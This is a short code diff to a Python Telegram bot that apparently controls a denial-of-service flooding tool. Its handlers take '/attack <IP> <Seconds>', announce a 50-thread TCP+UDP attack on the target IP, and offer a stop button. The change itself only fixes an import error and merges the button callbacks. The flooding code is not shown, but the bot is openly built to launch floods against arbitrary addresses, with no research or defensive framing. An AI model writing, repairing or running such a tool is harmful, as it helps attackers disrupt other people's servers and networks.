@@ -7,7 +7,7 @@ import random
 import logging
 from aiogram import Bot, Dispatcher
 from aiogram.enums import ParseMode
-from aiogram.filters import Command, F  # ✅ FIXED: Added 'F' here
+from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 
 # --- Configuration ---
@@ -171,14 +171,14 @@ async def cmd_attack(message: Message):
     
     await message.answer(f"🚀 **Attack Launched on {target_ip}!**\n⏳ Duration: {duration}s\n🔥 Threads: 50 (TCP+UDP Mixed)")
 
-@dp.callback_query(F.data == "start") # ✅ FIXED: F is now defined
-async def cb_start(callback: CallbackQuery):
-    await callback.message.edit_text("Send /attack <IP> <Seconds> to start.")
-
-@dp.callback_query(F.data == "stop")
-async def cb_stop(callback: CallbackQuery):
-    await cancel_all_attacks()
-    await callback.message.edit_text("🛑 **Attack Stopped.**")
+# ✅ FIXED: Removed 'F' dependency. Using direct string comparison.
+@dp.callback_query()
+async def cb_handler(callback: CallbackQuery):
+    if callback.data == "start":
+        await callback.message.edit_text("Send /attack <IP> <Seconds> to start.")
+    elif callback.data == "stop":
+        await cancel_all_attacks()
+        await callback.message.edit_text("🛑 **Attack Stopped.**")
 
 # --- Core Logic Functions ---
 
